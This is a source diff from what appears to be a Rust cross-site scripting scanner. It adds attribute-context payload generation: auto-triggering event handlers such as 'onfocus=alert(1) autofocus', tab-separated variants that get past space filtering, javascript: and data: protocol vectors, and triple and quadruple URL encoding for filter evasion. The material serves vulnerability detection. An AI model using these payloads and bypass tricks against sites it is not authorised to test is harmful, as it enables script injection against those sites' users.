@@ -13,29 +13,90 @@ pub fn generate_dynamic_payloads(context: &InjectionContext) -> Vec<String> {
     let mut payloads = Vec::new();
 
     match context {
-        InjectionContext::Attribute(delimiter_type) => {
+        InjectionContext::Attribute(delimiter_type)
+        | InjectionContext::AttributeUrl(delimiter_type) => {
+            let url_like = matches!(context, InjectionContext::AttributeUrl(_));
             let html_payloads = crate::payload::get_dynamic_xss_html_payloads();
             let attr_payloads = crate::payload::get_dynamic_xss_attribute_payloads();
+            let protocol_payloads = crate::payload::get_protocol_injection_payloads();
             match delimiter_type {
                 Some(DelimiterType::SingleQuote) => {
+                    if url_like {
+                        payloads.extend(protocol_payloads.iter().cloned());
+                    }
                     for payload in html_payloads.iter() {
                         payloads.push(format!("'>{}'", payload));
                     }
                     for payload in attr_payloads.iter() {
                         payloads.push(format!("' {} a='", payload));
                     }
+                    // Self-triggering event handler payloads (work even when < > are filtered)
+                    let autotrigger_events = [
+                        "onfocus=alert(1) autofocus",
+                        "onmouseover=alert(1)",
+                        "onfocus=alert(1) autofocus tabindex=0",
+                        "ontoggle=alert(1) popover",
+                        "onbeforeinput=alert(1) contenteditable",
+                        "onsecuritypolicyviolation=alert(1)",
+                        "onformdata=alert(1)",
+                        "onslotchange=alert(1)",
+                    ];
+                    for ev in &autotrigger_events {
+                        payloads.push(format!("' {} '", ev));
+                        // Tab separator variant (bypasses space filtering)
+                        payloads.push(format!("'\t{}\t'", ev));
+                    }
+                    if !url_like {
+                        // Protocol payloads for src/href attributes (e.g. iframe src='VALUE')
+                        // These don't need quote breaking since the protocol URI itself executes
+                        for payload in protocol_payloads.iter() {
+                            payloads.push(payload.clone());
+                        }
+                    }
                 }
                 Some(DelimiterType::DoubleQuote) => {
+                    if url_like {
+                        payloads.extend(protocol_payloads.iter().cloned());
+                    }
                     for payload in html_payloads.iter() {
                         payloads.push(format!("\">{}\"", payload));
                     }
                     for payload in attr_payloads.iter() {
                         payloads.push(format!("\" {} \"", payload));
                     }
+                    // Self-triggering event handler payloads (work even when < > are filtered)
+                    let autotrigger_events = [
+                        "onfocus=alert(1) autofocus",
+                        "onmouseover=alert(1)",
+                        "onfocus=alert(1) autofocus tabindex=0",
+                        "ontoggle=alert(1) popover",
+                        "onbeforeinput=alert(1) contenteditable",
+                        "onsecuritypolicyviolation=alert(1)",
+                        "onformdata=alert(1)",
+                        "onslotchange=alert(1)",
+                    ];
+                    for ev in &autotrigger_events {
+                        payloads.push(format!("\" {} \"", ev));
+                        // Tab separator variant (bypasses space filtering)
+                        payloads.push(format!("\"\t{}\t\"", ev));
+                    }
+                    if !url_like {
+                        // Protocol payloads for src/href attributes (e.g. iframe src="VALUE")
+                        for payload in protocol_payloads.iter() {
+                            payloads.push(payload.clone());
+                        }
+                    }
                 }
                 _ => {
+                    if url_like {
+                        payloads.extend(protocol_payloads.iter().cloned());
+                    }
                     payloads.extend(html_payloads);
                     payloads.extend(attr_payloads);
+                    if !url_like {
+                        // Protocol payloads for unquoted src/href attributes
+                        payloads.extend(protocol_payloads);
+                    }
                 }
             }
         }
@@ -102,6 +163,67 @@ pub fn generate_adaptive_payloads(
 ) -> Vec<String> {
     let base_payloads = generate_dynamic_payloads(context);
 
+    // When angle brackets are blocked in an attribute context, prioritize event handler
+    // payloads and skip HTML tag payloads to reduce noise and focus on what works.
+    let angle_brackets_blocked = invalid_specials.contains(&'<') || invalid_specials.contains(&'>');
+
+    let mut filtered_payloads: Vec<String> = if angle_brackets_blocked {
+        match context {
+            InjectionContext::Attribute(_)
+            | InjectionContext::AttributeUrl(_)
+            | InjectionContext::Html(_) => base_payloads
+                .into_iter()
+                .filter(|p| !p.contains('<') && !p.contains('>'))
+                .collect(),
+            _ => base_payloads,
+        }
+    } else {
+        base_payloads
+    };
+
+    // When angle brackets are blocked, add marker-carrying event handler
+    // payloads for DOM verification without needing new HTML tags.
+    // These work in attribute context and also in HTML context when the
+    // value is additionally reflected in attributes (which context
+    // detection may miss).
+    // Use id marker to avoid duplicate-attribute rejection by HTML5
+    // parsers when the injection point is itself a class attribute.
+    if angle_brackets_blocked {
+        let add_attr_payloads = matches!(
+            context,
+            InjectionContext::Attribute(_)
+                | InjectionContext::AttributeUrl(_)
+                | InjectionContext::Html(_)
+        );
+        if add_attr_payloads {
+            let id_marker = crate::scanning::markers::id_marker();
+            let events = [
+                "onfocus=alert(1) autofocus",
+                "onmouseover=alert(1)",
+                "onfocus=alert(1) autofocus tabindex=0",
+                "ontoggle=alert(1) popover",
+                "onbeforeinput=alert(1) contenteditable",
+                "onsecuritypolicyviolation=alert(1)",
+                "onformdata=alert(1)",
+                "onslotchange=alert(1)",
+            ];
+            let delimiter = match context {
+                InjectionContext::Attribute(d) | InjectionContext::AttributeUrl(d) => d.clone(),
+                _ => None,
+            };
+            let (open_q, close_q) = match &delimiter {
+                Some(DelimiterType::SingleQuote) => ("'", "'"),
+                _ => ("\"", "\""),
+            };
+            for ev in &events {
+                filtered_payloads.push(format!("{} {} id={} {}", open_q, ev, id_marker, close_q));
+                // Tab separator variant for space-filtered contexts
+                filtered_payloads
+                    .push(format!("{}\t{}\tid={}\t{}", open_q, ev, id_marker, close_q));
+            }
+        }
+    }
+
     // Use adaptive encoders from the encoding module
     let adaptive_encoders =
         crate::encoding::generate_adaptive_encodings(invalid_specials, valid_specials);
@@ -109,7 +231,7 @@ pub fn generate_adaptive_payloads(
     // Apply adaptive encoders
     let mut out = Vec::new();
     let mut seen = std::collections::HashSet::new();
-    for p in &base_payloads {
+    for p in &filtered_payloads {
         // Original
         if seen.insert(p.clone()) {
             out.push(p.clone());
@@ -127,6 +249,8 @@ pub fn generate_adaptive_payloads(
                 "url" => crate::encoding::url_encode(p),
                 "html" => crate::encoding::html_entity_encode(p),
                 "2url" => crate::encoding::double_url_encode(p),
+                "3url" => crate::encoding::triple_url_encode(p),
+                "4url" => crate::encoding::quadruple_url_encode(p),
                 "unicode" => crate::encoding::unicode_fullwidth_encode(p),
                 "zwsp" => crate::encoding::zero_width_encode(p),
                 _ => continue,
@@ -246,6 +370,22 @@ mod tests {
         )));
         assert!(!payloads.is_empty());
         assert!(payloads.iter().any(|p| p.starts_with("\"")));
+    }
+
+    #[test]
+    fn test_generate_dynamic_payloads_url_attribute_prioritizes_protocols() {
+        let payloads = generate_dynamic_payloads(&InjectionContext::AttributeUrl(Some(
+            DelimiterType::DoubleQuote,
+        )));
+        assert!(!payloads.is_empty());
+        assert!(
+            payloads[0].starts_with("javascript:")
+                || payloads[0].starts_with("Javascript:")
+                || payloads[0].starts_with("jAvAsCrIpT:")
+                || payloads[0].starts_with("data:text/html,"),
+            "expected URL-bearing attribute payloads to start with protocol vectors, got {}",
+            payloads[0]
+        );
     }
 
     #[test]
